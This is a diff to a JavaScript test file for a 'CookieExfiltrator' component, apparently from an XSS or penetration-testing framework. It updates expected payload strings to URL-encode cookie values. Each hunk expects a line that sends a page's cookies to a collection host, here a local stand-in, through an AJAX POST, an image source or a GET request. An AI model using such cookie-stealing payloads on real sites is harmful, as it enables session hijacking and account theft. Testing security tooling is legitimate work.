@@ -45,7 +45,7 @@ describe('CookieExfiltrator', () => {
 
         expect(payload).toEqual(
           expect.stringContaining(
-            `ajaxRequest('POST', 'http://127.0.0.1/', c, instance_id_cb)`
+            `ajaxRequest('POST', 'http://127.0.0.1/', 'cookie=' + encodeURIComponent(c), instance_id_cb)`
           )
         )
       })
@@ -68,7 +68,7 @@ describe('CookieExfiltrator', () => {
 
         expect(payload).toEqual(
           expect.stringContaining(
-            `i.src = 'http://127.0.0.1/?c=' + c`
+            `i.src = 'http://127.0.0.1/?c=' + encodeURIComponent(c)`
           )
         )
       })
@@ -86,7 +86,7 @@ describe('CookieExfiltrator', () => {
 
         expect(payload).toEqual(
           expect.stringContaining(
-            `ajaxRequest('GET', 'http://127.0.0.1/?c=' + c, undefined, instance_id_cb)`
+            `ajaxRequest('GET', 'http://127.0.0.1/?c=' + encodeURIComponent(c), undefined, instance_id_cb)`
           )
         )
       })
